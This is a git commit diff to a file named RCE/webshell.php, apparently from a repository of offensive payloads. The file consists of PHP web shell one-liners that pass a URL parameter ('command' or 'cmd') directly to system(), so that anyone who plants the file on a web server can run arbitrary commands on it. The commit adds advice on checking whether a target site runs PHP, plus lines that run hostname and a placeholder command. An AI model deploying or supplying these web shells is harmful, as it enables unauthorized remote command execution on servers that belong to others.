1dac4fb9751e79276dec090a58da26e076ec9382
GR1FF1N <125984037+4R1FF1N@users.noreply.github.com>
2024-07-18 20:57:00 +0100

    Update webshell.php

--- RCE/webshell.php
+++ RCE/webshell.php
@@ -1,2 +1,7 @@
+#For Obvious Reasons, this won't work if the website does not use PHP.
+#Check with Wappalyzer Web Extension if the website uses PHP
+
 <?php echo system($_GET['command']); ?>
 <?php echo system($_GET['cmd']); ?>
+<?php system(hostname);?>
+<?php system(COMMAND_TO_EXECUTE);?>
